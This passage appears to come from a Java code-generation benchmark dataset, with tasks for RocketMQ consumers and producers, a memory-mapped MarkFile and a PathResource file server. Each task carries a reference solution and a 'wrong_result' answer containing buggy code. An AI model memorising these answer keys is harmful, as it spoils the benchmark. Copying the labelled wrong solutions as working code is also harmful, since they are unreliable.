ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        consumer.start();\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    private void consumeMessage(MessageExt message) throws Exception {\n        // Implement custom message handling logic here\n        System.out.println(\"Received message: \" + new String(message.getBody()));\n    }\n}\n```"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class responsible for setting up a RocketMQ push consumer. It configures the consumer with NameServer address, consumption strategy, topic subscriptions, and message listeners. The consumer is started asynchronously after a short delay to ensure proper initialization.\n\nAttributes:\n- `uacPushMessageListener`: [UacPushMessageListener] - The message listener implementation that handles incoming messages\n- `paascloudProperties`: [PaascloudProperties] - Configuration properties containing RocketMQ settings\n- `taskExecutor`: [TaskExecutor] - Executor service for asynchronous consumer startup\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer with the following steps:\n  1. Creates a new DefaultMQPushConsumer instance with the consumer group from properties\n  2. Sets the NameServer address from properties\n  3. Configures consumption to start from the last offset\n  4. Parses and subscribes to topics and tags from constants\n  5. Registers the message listener\n  6. Sets thread pool size for message consumption\n  7. Starts the consumer asynchronously after a 5-second delay\n  8. Returns the configured consumer instance",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.mq.consumer.listener.UacPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.core.task.TaskExecutor;\n\n@Configuration\npublic class AliyunMqConfiguration {\n    @Resource\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.UAC.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                log.error(\"RocketMq OpcPushConsumer, Exception={}\", e.getMessage(), e);\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\n@Configuration\npublic class AliyunMqConfiguration {\n\n    private final UacPushMessageListener uacPushMessageListener;\n    private final PaascloudProperties paascloudProperties;\n    private final TaskExecutor taskExecutor;\n\n    public AliyunMqConfiguration(UacPushMessageListener uacPushMessageListener, PaascloudProperties paascloudProperties, TaskExecutor taskExecutor) {\n        this.uacPushMessageListener = uacPushMessageListener;\n        this.paascloudProperties = paascloudProperties;\n        this.taskExecutor = taskExecutor;\n    }\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getRocketmq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getRocketmq().getNameServer());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        consumer.subscribe(\"UacTopic\", \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> uacPushMessageListener.onMessage(msgs, context));\n        consumer.setConsumeThreadMin(5);\n        consumer.setConsumeThreadMax(20);\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                Thread.currentThread().interrupt();\n            }\n        });\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Create a Java class that manages a mark file for inter-process communication, allowing processes to check the status of another process through a shared memory-mapped file. The class should handle file creation, version checking, timestamp validation, and resource cleanup.\n\nClass Description: The MarkFile class provides a mechanism for processes to communicate their liveness status via a memory-mapped file. It supports checking version compatibility, monitoring heartbeat timestamps, and ensuring proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- markFile: File - The physical file used for marking process status\n- mappedBuffer: MappedByteBuffer - The memory-mapped buffer for file operations\n- buffer: UnsafeBuffer - Wrapper around mappedBuffer for atomic operations\n- isClosed: AtomicBoolean - Flag indicating whether resources have been released\n\nMethods:\n- MarkFile(File, boolean, int, int, int, long, EpochClock, IntConsumer, Consumer<String>) -> void - Constructor that initializes the mark file with version and timestamp fields\n- close() -> void - Releases resources and closes the file channel\n- mapNewOrExistingMarkFile(File, boolean, int, int, long, long, EpochClock, IntConsumer, Consumer<String>) -> MappedByteBuffer - Static method that maps the file into memory and performs version/timestamp validation\n- ensureMarkFileLink(File, File, String) -> void - Static method that manages symbolic links to the mark file directory",
    "Canonical_solution": "import org.agrona.concurrent.UnsafeBuffer;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\nimport java.util.function.IntConsumer;\nimport static java.nio.channels.FileChannel.MapMode.READ_WRITE;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.READ;\nimport static java.nio.file.StandardOpenOption.WRITE;\n\npublic class MarkFile implements AutoCloseable\n{\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed = new AtomicBoolean();\n\n    public MarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final int totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        this.markFile = markFile;\n        this.mappedBuffer = mapNewOrExistingMarkFile(\n            markFile,\n            shouldPreExist,\n            versionFieldOffset,\n            timestampFieldOffset,\n            totalFileLength,\n            timeoutMs,\n            epochClock,\n            versionCheck,\n            logger);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    public void close()\n    {\n        if (isClosed.compareAndSet(false, true))\n        {\n            BufferUtil.free(mappedBuffer);\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final long totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        MappedByteBuffer byteBuffer = null;\n\n        try (FileChannel channel = FileChannel.open(markFile.toPath(), CREATE, READ, WRITE))\n        {\n            byteBuffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, totalFileLength);\n            final UnsafeBuffer buffer = new UnsafeBuffer(byteBuffer);\n\n            if (shouldPreExist)\n            {\n                if (buffer.capacity() < (timestampFieldOffset + SIZE_OF_LONG))\n                {\n                    throw new IllegalStateException(\"active MarkFile too short capacity=\" + buffer.capacity() +\n                        \" < \" + (timestampFieldOffset + SIZE_OF_LONG));\n                }\n\n                final int version = buffer.getIntVolatile(versionFieldOffset);\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: Mark file exists: \" + markFile);\n                }\n\n                versionCheck.accept(version);\n\n                final long timestampMs = buffer.getLongVolatile(timestampFieldOffset);\n                final long timestampAgeMs = epochClock.time() - timestampMs;\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: heartbeat timestampMs=\" + timestampMs + \" ageMs=\" + timestampAgeMs);\n                }\n\n                if (timestampAgeMs < timeoutMs)\n                {\n                    throw new IllegalStateException(\"active Mark file detected\");\n                }\n            }\n        }\n        catch (final Exception ex)\n        {\n            if (null != byteBuffer)\n            {\n                BufferUtil.free(byteBuffer);\n            }\n\n            throw new RuntimeException(ex);\n        }\n\n        return byteBuffer;\n    }\n\n    public static void ensureMarkFileLink(final File serviceDir, final File actualFile, final String linkFilename)\n    {\n        final Path linkFile = new File(serviceDir, linkFilename).toPath();\n        if (serviceDir.equals(actualFile.getParentFile()))\n        {\n            try\n            {\n                Files.deleteIfExists(linkFile);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to remove old link file\", ex);\n            }\n        }\n        else\n        {\n            try\n            {\n                Files.write(\n                    linkFile,\n                    actualFile.getParent().getBytes(US_ASCII),\n                    StandardOpenOption.CREATE,\n                    StandardOpenOption.WRITE,\n                    StandardOpenOption.TRUNCATE_EXISTING);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to create link for mark file directory\", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class MarkFile implements AutoCloseable {\n    private final File markFile;\n    private MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed = new AtomicBoolean(false);\n\n    public MarkFile(File file, boolean createNew, int version, int timestampOffset, int heartbeatOffset, long heartbeatInterval, EpochClock clock, IntConsumer onInvalidVersion, Consumer<String> onError) throws IOException {\n        this.markFile = file;\n        this.mappedBuffer = mapNewOrExistingMarkFile(file, createNew, version, timestampOffset, heartbeatOffset, heartbeatInterval, clock, onInvalidVersion, onError);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (mappedBuffer != null) {\n                    ((sun.nio.ch.FileChannelImpl) getFileChannel()).close();\n                }\n            } catch (IOException | ClassCastException e) {\n                // Ignore or log as necessary\n            }\n        }\n    }\n\n    static MappedByteBuffer mapNewOrExistingMarkFile(File file, boolean createNew, int expectedVersion, int timestampOffset, int heartbeatOffset, long heartbeatInterval, EpochClock clock, IntConsumer onInvalidVersion, Consumer<String> onError) throws IOException {\n        Path path = file.toPath();\n        FileChannel channel;\n        if (createNew) {\n            Files.deleteIfExists(path);\n            channel = FileChannel.open(path, StandardOpenOption.CREATE_NEW, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        } else {\n            channel = FileChannel.open(path, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        }\n\n        MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, 1024);\n        int currentVersion = buffer.getInt(0);\n        if (currentVersion != expectedVersion) {\n            onInvalidVersion.accept(currentVersion);\n        }\n\n        long lastHeartbeat = buffer.getLong(timestampOffset);\n        if (clock.currentTimeInMillis() - lastHeartbeat > heartbeatInterval) {\n            buffer.putLong(timestampOffset, clock.currentTimeInMillis());\n            buffer.putInt(heartbeatOffset, 1);\n        }\n\n        return buffer;\n    }\n\n    static void ensureMarkFileLink(File linkTargetDir, File linkName, String name) throws IOException {\n        Path linkPath = linkName.toPath();\n        Path targetPath = Paths.get(linkTargetDir.getAbsolutePath(), name);\n        if (Files.exists(linkPath)) {\n            Files.delete(linkPath);\n        }\n        Files.createSymbolicLink(linkPath, targetPath);\n    }\n\n    private FileChannel getFileChannel() {\n        return (FileChannel) java.lang.reflect.FieldUtils.readField(mappedBuffer, \"fc\", true);\n    }\n\n    static class UnsafeBuffer {\n        private final MappedByteBuffer buffer;\n\n        UnsafeBuffer(MappedByteBuffer buffer) {\n            this.buffer = buffer;\n        }\n\n        void putInt(int offset, int value) {\n            buffer.putInt(offset, value);\n        }\n\n        int getInt(int offset) {\n            return buffer.getInt(offset);\n        }\n\n        void putLong(int offset, long value) {\n            buffer.putLong(offset, value);\n        }\n\n        long getLong(int offset) {\n            return buffer.getLong(offset);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a resource handler class that serves file content from a specified path, supporting both full file serving and range requests, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: PathResource is a file resource handler that serves content from a file system path, supporting standard and ranged requests. It utilizes FileChannel for efficient reading and implements resource management through a PathResourceManager.\n\nAttributes:\n- file: Path - The file path to serve content from\n- manager: PathResourceManager - Manages resource access and transfer size thresholds\n\nMethods:\n- serve(Sender, HttpServerExchange, IoCallback) -> void - Serves the entire file content to the client\n- serveRange(Sender, HttpServerExchange, long, long, IoCallback) -> void - Serves a specific byte range of the file content\n- getContentLength() -> Long - Returns the size of the file in bytes or null if unavailable\n- serveImpl(Sender, HttpServerExchange, long, long, IoCallback, boolean) -> void - Internal implementation handling both full and ranged requests\n\nThe class uses nested BaseFileTask, ServerTask, and TransferTask classes to handle different serving strategies:\n- ServerTask: Reads file content in chunks using pooled buffers\n- TransferTask: Uses zero-copy transfer for efficient large file serving\n\nThe implementation demonstrates proper FileChannel usage including:\n1. Opening channels with StandardOpenOption.READ\n2. Position manipulation for range requests\n3. Proper resource cleanup with safeClose\n4. Buffer management with PooledByteBuffer\n5. Error handling for file operations",
    "Canonical_solution": "import io.undertow.io.IoCallback;\nimport io.undertow.io.Sender;\nimport io.undertow.server.HttpServerExchange;\nimport io.undertow.connector.PooledByteBuffer;\nimport org.xnio.IoUtils;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.NoSuchFileException;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class PathResource implements RangeAwareResource {\n\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(final Path file, final PathResourceManager manager, String path) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    @Override\n    public void serve(final Sender sender, final HttpServerExchange exchange, final IoCallback callback) {\n        serveImpl(sender, exchange, -1, -1, callback, false);\n    }\n\n    @Override\n    public void serveRange(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    private void serveImpl(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback, final boolean range) {\n        abstract class BaseFileTask implements Runnable {\n            protected volatile FileChannel fileChannel;\n\n            protected boolean openFile() {\n                try {\n                    fileChannel = FileChannel.open(file, StandardOpenOption.READ);\n                    if(range) {\n                        fileChannel.position(start);\n                    }\n                } catch (NoSuchFileException e) {\n                    exchange.setStatusCode(StatusCodes.NOT_FOUND);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                } catch (IOException e) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                }\n                return true;\n            }\n        }\n\n        class ServerTask extends BaseFileTask implements IoCallback {\n            private PooledByteBuffer pooled;\n            long remaining = end - start + 1;\n\n            @Override\n            public void run() {\n                if(range && remaining == 0) {\n                    if (pooled != null) {\n                        pooled.close();\n                        pooled = null;\n                    }\n                    IoUtils.safeClose(fileChannel);\n                    callback.onComplete(exchange, sender);\n                    return;\n                }\n                if (fileChannel == null) {\n                    if (!openFile()) {\n                        return;\n                    }\n                    pooled = exchange.getConnection().getByteBufferPool().allocate();\n                }\n                if (pooled != null) {\n                    ByteBuffer buffer = pooled.getBuffer();\n                    try {\n                        buffer.clear();\n                        int res = fileChannel.read(buffer);\n                        if (res == -1) {\n                            pooled.close();\n                            IoUtils.safeClose(fileChannel);\n                            callback.onComplete(exchange, sender);\n                            return;\n                        }\n                        buffer.flip();\n                        if(range) {\n                            if(buffer.remaining() > remaining) {\n                                buffer.limit((int) (buffer.position() + remaining));\n                            }\n                            remaining -= buffer.remaining();\n                        }\n                        sender.send(buffer, this);\n                    } catch (IOException e) {\n                        onException(exchange, sender, e);\n                    }\n                }\n            }\n\n            @Override\n            public void onComplete(final HttpServerExchange exchange, final Sender sender) {\n                if (exchange.isInIoThread()) {\n                    exchange.dispatch(this);\n                } else {\n                    run();\n                }\n            }\n\n            @Override\n            public void onException(final HttpServerExchange exchange, final Sender sender, final IOException exception) {\n                if (pooled != null) {\n                    pooled.close();\n                    pooled = null;\n                }\n                IoUtils.safeClose(fileChannel);\n                if (!exchange.isResponseStarted()) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                }\n                callback.onException(exchange, sender, exception);\n            }\n        }\n\n        class TransferTask extends BaseFileTask {\n            @Override\n            public void run() {\n                if (!openFile()) {\n                    return;\n                }\n                sender.transferFrom(fileChannel, new IoCallback() {\n                    @Override\n                    public void onComplete(HttpServerExchange exchange, Sender sender) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onComplete(exchange, sender);\n                        }\n                    }\n\n                    @Override\n                    public void onException(HttpServerExchange exchange, Sender sender, IOException exception) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onException(exchange, sender, exception);\n                        }\n                    }\n                });\n            }\n        }\n\n        BaseFileTask task;\n        try {\n            task = manager.getTransferMinSize() > Files.size(file) || range ? new ServerTask() : new TransferTask();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        if (exchange.isInIoThread()) {\n            exchange.dispatch(task);\n        } else {\n            task.run();\n        }\n    }\n\n    @Override\n    public Long getContentLength() {\n        try {\n            if (Files.isSymbolicLink(file) && Files.notExists(file)) {\n                return null;\n            }\n            return Files.size(file);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class PathResource {\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(Path file, PathResourceManager manager) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    public void serve(Sender sender, HttpServerExchange exchange, IoCallback callback) {\n        serveImpl(sender, exchange, 0, getContentLength(), callback, false);\n    }\n\n    public void serveRange(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) {\n        serveImpl(sender, exchange, start, end - start + 1, callback, true);\n    }\n\n    public Long getContentLength() {\n        try {\n            return file.toFile().length();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    private void serveImpl(Sender sender, HttpServerExchange exchange, long offset, long length, IoCallback callback, boolean isRange) {\n        FileChannel channel = null;\n        try {\n            channel = FileChannel.open(file, StandardOpenOption.READ);\n            if (channel.size() < offset) {\n                exchange.setStatusCode(416);\n                callback.onComplete(null);\n                return;\n            }\n            long remaining = length;\n            if (manager.isTransferSupported()) {\n                new TransferTask(channel, sender, exchange, offset, remaining, isRange).start();\n            } else {\n                new ServerTask(channel, sender, exchange, offset, remaining, isRange).start();\n            }\n        } catch (IOException e) {\n            safeClose(channel);\n            callback.onError(e);\n        }\n    }\n\n    private static void safeClose(FileChannel channel) {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException ignored) {\n            }\n        }\n    }\n\n    abstract class BaseFileTask implements Runnable {\n        protected final FileChannel channel;\n        protected final Sender sender;\n        protected final HttpServerExchange exchange;\n        protected final long startOffset;\n        protected final long totalLength;\n        protected final boolean isRangeRequest;\n\n        BaseFileTask(FileChannel channel, Sender sender, HttpServerExchange exchange, long startOffset, long totalLength, boolean isRangeRequest) {\n            this.channel = channel;\n            this.sender = sender;\n            this.exchange = exchange;\n            this.startOffset = startOffset;\n            this.totalLength = totalLength;\n            this.isRangeRequest = isRangeRequest;\n        }\n\n        @Override\n        public void run() {\n            try {\n                doRun();\n            } catch (Exception e) {\n                safeClose(channel);\n            }\n        }\n\n        protected abstract void doRun() throws Exception;\n    }\n\n    class ServerTask extends BaseFileTask {\n        private static final int BUFFER_SIZE = 8192;\n\n        ServerTask(FileChannel channel, Sender sender, HttpServerExchange exchange, long startOffset, long totalLength, boolean isRangeRequest) {\n            super(channel, sender, exchange, startOffset, totalLength, isRangeRequest);\n        }\n\n        @Override\n        protected void doRun() throws Exception {\n            channel.position(startOffset);\n            long remaining = totalLength;\n            while (remaining > 0) {\n                ByteBuffer buffer = PooledByteBuffer.allocate(BUFFER_SIZE);\n                int read = channel.read(buffer);\n                if (read == -1) break;\n                buffer.flip();\n                sender.send(buffer);\n                remaining -= read;\n            }\n            sender.endExchange();\n        }\n    }\n\n    class TransferTask extends BaseFileTask {\n        TransferTask(FileChannel channel, Sender sender, HttpServerExchange exchange, long startOffset, long totalLength, boolean isRangeRequest) {\n            super(channel, sender, exchange, startOffset, totalLength, isRangeRequest);\n        }\n\n        @Override\n        protected void doRun() throws Exception {\n            channel.transferTo(startOffset, totalLength, sender.getChannel());\n            sender.endExchange();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with configurable group, tags, and keys.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending, and shutdown operations. The class provides methods to start the producer, send messages synchronously, and gracefully shut down the producer.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- group: String - The producer group name\n- topic: String - The topic to which messages will be sent\n- tags: String - The tags for message categorization\n- keys: String - The keys for message identification\n\nMethods:\n- Producer(String group, String topic, String tags, String keys) -> void - Constructor that initializes the producer with given group, topic, tags, and keys\n- start() -> void - Starts the producer instance\n- sendMessage(String messageContent) -> SendResult - Synchronously sends a message with the given content and returns the send result\n- shutdown() -> void - Shuts down the producer instance\n- buildCommandline(String[] args) -> CommandLine - Static method that builds and parses command line arguments for producer configuration",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) throws MQClientException {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n        this.producer.setInstanceName(Long.toString(System.currentTimeMillis()));\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        Message msg = new Message(\n            topic,\n            tags,\n            keys,\n            messageContent.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        final Options options = new Options();\n        Option opt = new Option(\"h\", \"help\", false, \"Print help\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"g\", \"producerGroup\", true, \"Producer Group Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Topic Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"a\", \"tags\", true, \"Tags Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"k\", \"keys\", true, \"Keys Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"c\", \"msgCount\", true, \"Message Count\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        DefaultParser parser = new DefaultParser();\n        HelpFormatter hf = new HelpFormatter();\n        hf.setWidth(110);\n        CommandLine commandLine = null;\n        try {\n            commandLine = parser.parse(options, args);\n            if (commandLine.hasOption('h')) {\n                hf.printHelp(\"producer\", options, true);\n                return null;\n            }\n        } catch (ParseException e) {\n            hf.printHelp(\"producer\", options, true);\n            return null;\n        }\n\n        return commandLine;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.commons.cli.*;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(this.group);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, keys.getBytes(), messageContent.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        Options options = new Options();\n        Option groupOpt = new Option(\"g\", \"group\", true, \"producer group\");\n        Option topicOpt = new Option(\"t\", \"topic\", true, \"message topic\");\n        Option tagsOpt = new Option(\"s\", \"tags\", true, \"message tags\");\n        Option keysOpt = new Option(\"k\", \"keys\", true, \"message keys\");\n\n        options.addOption(groupOpt);\n        options.addOption(topicOpt);\n        options.addOption(tagsOpt);\n        options.addOption(keysOpt);\n\n        CommandLineParser parser = new DefaultParser();\n        try {\n            return parser.parse(options, args);\n        } catch (ParseException e) {\n            HelpFormatter formatter = new HelpFormatter();\n            formatter.printHelp(\"Producer\", options);\n            System.exit(1);\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Java class that implements an Icecast HTTP audio broadcaster using Apache MINA for TCP client communication. The class should handle connection management, session handling, and error states for streaming audio to an Icecast server.\n\nClass Description: The IcecastHTTPAudioBroadcaster class manages the connection and streaming of audio data to an Icecast server using HTTP over TCP. It handles connection states, authentication, and error recovery while maintaining a persistent session with the server.\n\nAttributes:\n- mLog: Logger - Logger instance for logging events and errors\n- RECONNECT_INTERVAL_MILLISECONDS: long - Time interval between connection attempts (30 seconds)\n- mSocketConnector: NioSocketConnector - MINA socket connector for TCP communication\n- mStreamingSession: IoSession - Current active streaming session\n- mConnecting: AtomicBoolean - Flag indicating if a connection attempt is in progress\n- mLastConnectionAttempt: long - Timestamp of last connection attempt\n\nMethods:\n- IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) -> void - Constructor that initializes the broadcaster with configuration\n- connect() -> boolean - Attempts to establish a connection to the Icecast server, returns true if successful\n- disconnect() -> void - Closes the current streaming session and cleans up resources\n- connected() -> boolean - Returns true if currently connected to the server\n- canConnect() -> boolean - Returns true if conditions allow for a connection attempt\n- getBroadcastConfiguration() -> IcecastHTTPConfiguration - Returns the current broadcast configuration\n- setBroadcastState(BroadcastState state) -> void - Updates the current broadcast state\n- getBroadcastState() -> BroadcastState - Returns the current broadcast state\n- getHTTPHeaders() -> Map<String,String> - Returns HTTP headers for the connection\n- getConfiguration() -> IcecastHTTPConfiguration - Returns the configuration object\n\nInner Class:\n- IcecastHTTPIOHandler extends IoHandlerAdapter - Handles MINA session events\n  Methods:\n  - sessionOpened(IoSession session) -> void - Sends HTTP PUT request when session opens\n  - sessionClosed(IoSession session) -> void - Handles session cleanup when closed\n  - exceptionCaught(IoSession session, Throwable throwable) -> void - Handles connection exceptions\n  - messageReceived(IoSession session, Object object) -> void - Processes server responses",
